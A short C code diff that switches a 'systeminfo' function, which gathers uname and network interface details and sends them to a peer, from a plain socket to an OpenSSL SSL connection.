@@ -7,10 +7,10 @@
 #include <ifaddrs.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
-
+#include <openssl/ssl.h>
 #include "../Generic/send_receive.h"
 
-void * systeminfo(int sockfd)
+void * systeminfo(SSL* ssl)
 {
     struct utsname systemInfo;
     uname(&systemInfo);
@@ -45,7 +45,7 @@ void * systeminfo(int sockfd)
     freeifaddrs(ifAddrStruct);
     puts("Got system info");
     printf("%s", platformInfo);
-    send_data(sockfd, platformInfo);
+    send_data(ssl, platformInfo);
 }
 
 
